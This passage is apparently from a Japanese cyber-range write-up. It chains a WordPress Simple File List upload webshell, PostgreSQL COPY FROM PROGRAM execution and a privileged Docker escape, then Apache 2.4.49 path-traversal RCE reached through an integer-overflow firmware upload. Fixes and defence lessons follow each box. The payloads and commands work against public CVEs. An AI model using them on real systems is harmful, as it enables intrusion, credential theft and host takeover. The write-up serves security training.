**修正：** スキームをホワイトリストせずにユーザー制御文字列を `copy()`/`file_exists()`/`md5_file()` に渡さない。`phar://` の使用を信頼できるアーカイブに制限。制御可能なプロパティを持つ `__destruct`、`__wakeup`、`__toString` および類似のマジックメソッドについてガジェットクラスを監査する。

---

## WEB 9 (wp.edu.stf) — WordPress プラグイン RCE、PostgreSQL 特権昇格、Docker エスケープ

これがレンジで最長のチェーン。WordPress 5.8.3、`simple-file-list` プラグイン バージョン 4.1.3。プラグインは CVE-2020-36847（未認証ファイルアップロード → RCE）に脆弱。

プラグインバージョンを確認：

```bash
curl -s http://wp.edu.stf/wp-content/plugins/simple-file-list/readme.txt | head -10
```

`Stable tag: 4.1.3` — 脆弱。

プラグインのアップロードエンジン（`ee-upload-engine.php`）とファイルエンジン（`ee-file-engine.php`）は認証なしでリクエストを受け付ける。CSRF 保護は `MD5("unique_salt" + timestamp)` で構築されたトークンで、`unique_salt` はプラグインソースに焼き込まれた定数（readme またはソースファイルを読んで確認可能）。

アップロードリクエスト：

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.png

TS=$(date +%s)
TOKEN=$(echo -n "unique_salt${TS}" | md5sum | cut -d' ' -f1)

curl -v -X POST \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=${TS}" \
  -F "eeSFL_Token=${TOKEN}" \
  -F "file=@shell.png;type=image/png" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-upload-engine.php
```

ファイルは `/wp-content/uploads/simple-file-list/shell.png` に落ちる。ファイルエンジン経由でリネーム：

```bash
curl -X POST \
  --data-urlencode "eeSFL_ID=1" \
  --data-urlencode "eeFileOld=shell.png" \
  --data-urlencode "eeListFolder=/" \
  --data-urlencode "eeFileAction=Rename|shell.php" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-file-engine.php
```

`eeFileAction=Rename|shell.php` は操作/引数のペア。プラグインは `|` で分割し、最初の部分を操作、2 番目を引数として使う。リネームハンドラに拡張子チェックがないため、`.png` が `.php` になる。

シェルアクセス：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=id"
```

そこから、データベース認証情報のために `wp-config.php` を読む：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=cat+%2Fvar%2Fwww%2Fhtml%2Fwp-config.php+%7C+grep+-E+'DB_HOST%7CDB_USER%7CDB_PASSWORD%7CDB_NAME'"
```

`postgres:postgres@db:5432/postgres` を得る。

WordPress コンテナは Docker ネットワーク内（`hostname` と `ip a` から `172.19.0.0/16`）。隣接ホストをスキャン：

```bash
for i in 1 2 4 5 6 7; do timeout 1 bash -c "echo >/dev/tcp/172.19.0.$i/5432" 2>/dev/null && echo "172.19.0.$i:5432 - OPEN"; done
```

`172.19.0.2:5432` が開いている。DB は別コンテナ。

PostgreSQL 9.3-11 には CVE-2019-9193 — `COPY ... FROM PROGRAM` はデータベーススーパーユーザーとしてシェルコマンドを実行する。このコンテナの `postgres` ユーザーはスーパーユーザー。WordPress PHP シェルを悪用して `pg_connect` 経由で任意の SQL を実行できる：

```php
<?php
$cmd = $_GET['cmd'] ?? 'id';
$db = pg_connect("host=172.19.0.2 port=5432 dbname=postgres user=postgres password=postgres");
$result = pg_query($db, "DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec(cmd_output text);
    COPY cmd_exec FROM PROGRAM '" . pg_escape_string($cmd) . "';
    SELECT * FROM cmd_exec;");
while ($row = pg_fetch_row($result)) { echo $row[0] . "\n"; }
```

WordPress アップロードディレクトリに `pgexec.php` として落とす：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=id"
```

PostgreSQL コンテナで `id` を実行。そこから `/bin/bash` の SUID を確認：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=ls+-la+/bin/bash"
```

`-rwsr-sr-x` — bash は SUID。root として RCE：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+id"
```

`euid=0(root)`。

次に Docker エスケープ。機能について `/proc/1/status` を読む：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/status+|+grep+-i+cap'"
```

`CapInh: 0000003fffffffff` — これは特権コンテナ。`CAP_SYS_ADMIN` を含むすべての機能が有効。

マウントを確認：

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/mountinfo+|+head+-5'"
```

overlay ファイルシステムは `/dev/mapper/ubuntu--vg-ubuntu--lv`、ホストの LVM ボリュームからマウントされている。`CAP_SYS_ADMIN` が設定されているため、コンテナ内でホストのファイルシステムをマウントできる：

```bash
unshare -Urm bash -c 'mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt/hostroot && ls -la /mnt/hostroot/home/ && /mnt/hostroot/home/rceflag'
```

`unshare -Urm` は新しいユーザー名前空間（`-U`）を作成し、root をマップ（`-r`）、マウントする（`-m`）。これは、コンテナ内に `CAP_SYS_ADMIN` が存在していても、カーネルは `mount()` がユーザー名前空間の後に作成されたマウント名前空間で行われることを依然として要求するため必要。

`unshare` が使えない場合の代替 — `debugfs` で生ブロックデバイスを読む：

```bash
debugfs -R "ls /home/" /dev/dm-0 2>/dev/null
debugfs -R "cat /home/rceflag" /dev/dm-0 2>/dev/null
```

`debugfs` は ext4 構造をブロックデバイスから直接読み取り、マウントを完全にバイパスする。ブロックデバイス `/dev/dm-0` はコンテナに `/dev/mapper/ubuntu--vg-ubuntu--lv` としてマップされた LVM 論理ボリューム。コンテナ内で euid 0 なので `DAC_OVERRIDE` があり、生デバイスを読める。

フラグをダンプ：

```bash
debugfs -R "dump /root/flags/rce/rce.flag /tmp/rce.flag" /dev/dm-0
mkdir -p /root/flags/rce/
cp /tmp/rce.flag /root/flags/rce/rce.flag
/tmp/rceflag
```

**なぜこれが成功したか：** 4 つの積み重なった問題。

1. 公開された既知の未認証アップロード → RCE を持つ WordPress プラグイン
2. 隣接 PostgreSQL コンテナへの認証情報
3. PostgreSQL の `COPY FROM PROGRAM` がスーパーユーザーとしてコマンド実行を許可
4. ホストのブロックデバイスが見える `CAP_SYS_ADMIN` 特権コンテナ

各々単独でも深刻な問題。組み合わせると、未認証の攻撃者が WordPress コンテナの `www-data` からホストの root まで行ける。

**修正：** WordPress プラグインを更新、コンテナ内で PostgreSQL をスーパーユーザーとして実行しない、本当に必要でない限りコンテナを特権で実行しない、`--userns-remap` でユーザー名前空間を使いコンテナ root がホスト root と等しくならないようにする。

---

## WEB 10 (calculator.edu.stf) — ビジネスロジック、整数オーバーフロー、Apache 2.4.49

このボックスには 2 つのサービス：8080 の Go アプリケーション（「電力網シミュレータ」）と、80 の Apache 2.4.49（2021 年の 2 つの CVE のうちの 1 つ）。

### Apache 2.4.49 — CVE-2021-41773 / CVE-2021-42013

バージョンチェック：

```bash
curl -I http://10.124.1.232/
```

`Server: Apache/2.4.49 (Ubuntu)`。これは CVE-2021-41773（パストラバーサルと RCE）と CVE-2021-42013（その不完全な修正）の影響を受ける正確なバージョン。

パストラバーサルは `%2e%2e` エンコードで機能する：

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

`mod_cgi` が有効なら、任意のコマンドを実行できる：

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

このボックスでは `mod_cgi` はデフォルトで無効。パストラバーサルはファイル読み取りに機能するが、RCE には `mod_cgi` を有効にする必要がある。そこで Go アプリケーションの出番 — `mod_cgi` を有効にできる。

### 8080 の Go アプリケーション

`http://10.124.1.232:8080/` のフォームは単一の `temp` フィールド（メガワット）を取り、「送電損失」の計算を返す。ファジング：

```bash
# 空
curl -s -X POST "http://10.124.1.232:8080/" -d ""

# 通常
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=50"

# ゼロ
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=0"

# 負
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=-100"

# HTML の max="100" を超えて
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=999999999999"

# インジェクションテスト
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=' OR 1=1--"
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=\`id\`"
```

HTML には `min="0" max="100"` とあるが、バックエンドは何でも受け付ける。`temp=999999999999` は次を生む：

```
Considering transmission line losses, 1,000,099,999,998,999,900 Watts requested. The simulator showed the impossibility of allocating
```

いくつかのデータ点から式を逆算する：

| temp | 報告ワット |
|------|-----------|
| 1 | 1,000,100 |
| 10 | 10,001,000 |
| 100 | 100,010,000 |
| 999,999,999,999 | 1,000,099,999,998,999,900 |

式は `result = temp * 1,000,100` = `temp * (1,000,000 + 100)` = `temp * 10^6 + temp * 100`。アプリケーションは要求値に固定の 100.01% の「損失」を加える。

次にオーバーフロー領域に押し込む。`int64` の最大は `9,223,372,036,854,775,807`。`temp * 1,000,100` をそれを超えさせる値を試す：

```bash
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=10000000000000"
```

返す：

```
Considering transmission line losses, -8,445,744,073,709,551,616 Watts requested Unexpected simulator behavior! Check the firmware file at [this link]
```

数値が負にラップ — 古典的な符号付き整数オーバーフロー。そして重要なことに、レスポンスには新しいフォームが含まれる：

```html
<form enctype="multipart/form-data" method="POST" action="/DNx4Vbb3bQbXstaUf9YkppEV">
    <label for="firmware">Firmware update</label>
    <input name="firmware" type="file" id="firmware"/>
    <input type="submit" value="Submit"/>
</form>
```

これが隠されたファームウェア更新エンドポイント。アクション URL `/DNx4Vbb3bQbXstaUf9YkppEV` はランダムパスで、最初にオーバーフロー条件を踏まないと到達できない — これがチャレンジのゲート。

現在のファームウェアをダウンロード：

```bash
curl -s "http://10.124.1.232:8080/firmware" -o firmware_original.bin
file firmware_original.bin
```

`ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=...`。文字列：

```bash
strings firmware_original.bin | grep -E "\./firmware|sim\.sh|update\.zip|os/exec"
```

関連する文字列：

```
./firmware/sim.sh
./firmware/update.zip
os/exec
/home/user/standoff_go/simulator.go
```

Go バイナリは `update.zip` を受け取ることを期待し、`os/exec` を使ってその中の `./firmware/sim.sh` を実行する。つまり、自作の `sim.sh` を含む ZIP をアップロードして、Go アプリのユーザーとしてコード実行を取得できる。

ZIP をビルド：

```bash
cat > /tmp/sim.sh << 'EOF'
#!/bin/bash
/bin/ln -sf /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
/usr/sbin/apache2ctl -k graceful
EOF
chmod +x /tmp/sim.sh
cd /tmp && zip -0 update.zip sim.sh
```

`zip -0` はファイルを無圧縮で保存する — 一部の Go ZIP ライブラリは圧縮データを拒否する。

アップロード：

```bash
curl -s -X POST "http://10.124.1.232:8080/DNx4Vbb3bQbXstaUf9YkppEV" \
  -F "firmware=@/tmp/update.zip;type=application/zip"
```

レスポンスは通常のシミュレーションレスポンスとして返るが、スクリプトは実行済み。`mod_cgi` は Apache で有効になった。

次に Apache RCE：

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; /home/rceflag"
```

`/home/rceflag` が実行され、フラグを返す。

LPE については、このボックスは WEB 9 と同じパターン — `/home/rceflag` の SUID または機能を確認する。`find / -perm -4000 -type f` で通常何か見つかる。このボックスではチャレンジはアプリユーザーとして rceflag を読むことだけを要求するので、LPE は不要。

**なぜこれが成功したか：** 3 つの問題。

1. Apache 2.4.49 パストラバーサル — よく知られているが、`mod_cgi` が無効だったため RCE は直接機能しなかった。
2. Go アプリは数値計算のクライアント入力を信頼し、範囲チェックがなく、整数オーバーフローを許した。
3. オーバーフロー状態が、任意の ZIP ファイルを受け付けるデバッグエンドポイントを露出し、ファームウェア更新ハンドラは署名検証なしで ZIP から `sim.sh` を展開・実行した。

(1) と (3) を結ぶ点 — `mod_cgi` の有効化 — が、これが 2 ステップチェーンである理由。どちらのバグ単独でもファイル読み取り（`/etc/passwd`）またはデバッグエンドポイントを与える。組み合わせると RCE を与える。

**修正：** ファームウェア更新に署名し、展開前に署名を検証する。`sim.sh` の内容をホワイトリストに対して検証する。クライアント提供のアーカイブから実行可能ファイルを展開しない。Apache をアップグレード。

---

## テクニックまとめ

| ボックス | 主要脆弱性 | チェーン |
|---------|-----------|---------|
| 1 | ファイルアップロードバイパス + CVE-2023-4911 | PHP を `.png` としてアップロード → Looney Tunables で LPE |
| 2 | LFI + ログポイズニング | FTP ユーザー名 → `vsftpd.log` → LFI インクルード |
| 3 | SSRF + Gopher + PHP-FPM | SSRF から Gopher → 9000 の FastCGI → RCE |
| 4 | 露出 SQL ダンプ + アップロード | `hellophones.sql` を読む → 管理者ログイン → `.php` アップロード |
| 5 | ペイロード内に鍵を持つ JWT | 管理者トークン偽造 → 隠し管理者ページ → SQL インジェクション |
| 6 | ハードコード JWT 鍵 + アップロード | `authenticate.php` を読む → JWT 偽造 → `.phtml` アップロード |
| 7 | XXE + コマンドインジェクション | OOB XXE → `evil.dtd` → ソース読み取り → `$HTTP_USER_AGENT` インジェクション |
| 8 | PHAR デシリアライゼーション | PHAR の URL アップロード → `phar://` トリガー → `__destruct` ガジェット |
| 9 | WP プラグイン + PostgreSQL + Docker | CVE-2020-36847 → `COPY FROM PROGRAM` → `CAP_SYS_ADMIN` エスケープ |
| 10 | 整数オーバーフロー + Apache 2.4.49 | オーバーフロー → ファームウェアアップロード → `mod_cgi` 有効化 → CVE-2021-41773 |

## 防御のポイント

繰り返し現れるテーマ：

- **バージョンピニングは重要。** 古い Apache（2.4.49）、古い `glibc`（2.36）、古い WordPress（5.8.3）、古いプラグイン（4.1.3）。いずれも公開から数時間以内に公開エクスプロイトがある。
- **自動ツールは中級レンジで勝つ。** 10 ボックスのうち 3 つは手動チェーンなしで自動エクスプロイト（`looney-tunables`、`Gopherus`、`sqlmap`）に落ちた。
- **ハードコードされた秘密が至る所にある。** `authenticate.php` の JWT 署名鍵、JWT ペイロード内の鍵、プラグインソースの `unique_salt` 定数。いずれも軽微なファイル読み取りを RCE に変える 1 行。
- **デシリアライゼーションは見た目より狡猾。** PHAR メタデータは `phar://` ラッパーでの任意のファイル操作でデシリアライズする — `unserialize()` が明示的に呼ばれる必要はない。`unserialize` の監査はこれを完全に見逃す。
- **コンテナ分離はセキュリティ境界ではない。** `CAP_SYS_ADMIN` を持ち、ホストの LVM ブロックデバイスが見える特権コンテナは、ベアメタルの root シェルと等価。`userns-remap`、ドロップされたケイパビリティ、読み取り専用バインドマウントはオプションではない。
- **ビジネスロジックバグはしばしばオーバーフローバグの変装。** 計算機の「ただの数値」入力が RCE チェーンの鍵になったのは、開発者が HTML の `max="100"` を信頼して上限を強制していたから。ブラウザはセキュリティ制御ではない。サーバーが検証しなければならない。

各ボックスは単独の脆弱性だが、このレンジのすべてのチェーンは 2 つか 3 つをペアにする。教訓はペアリングにある — 最初に見つけたバグは、通常ボックスを仕上げるバグではない。


2026/07/27
